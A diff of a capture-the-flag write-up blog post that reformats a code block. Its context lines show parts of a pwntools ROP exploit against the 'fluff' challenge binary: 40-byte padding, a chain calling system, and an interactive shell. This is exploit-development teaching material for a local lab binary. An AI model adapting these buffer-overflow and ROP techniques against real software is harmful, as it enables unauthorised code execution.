@@ -138,7 +138,8 @@ categories: [buffer overflow, CTF, dplastico, exploit dev, exploitdev, pwn, rop,
 <!-- /wp:paragraph -->
 
 <!-- wp:code -->
-<pre class="wp-block-code"><code>from pwn import *
+```python
+from pwn import *
 
 e = ELF('./fluff')
 r = process("./fluff")
@@ -185,7 +186,8 @@ rop += p64(e.symbols['system']) #magia de pwntools
 payload = "A" * 40
 payload += rop
 r.sendlineafter("&gt;", payload)
-r.interactive()</code></pre>
+r.interactive()
+```
 <!-- /wp:code -->
 
 <!-- wp:paragraph -->
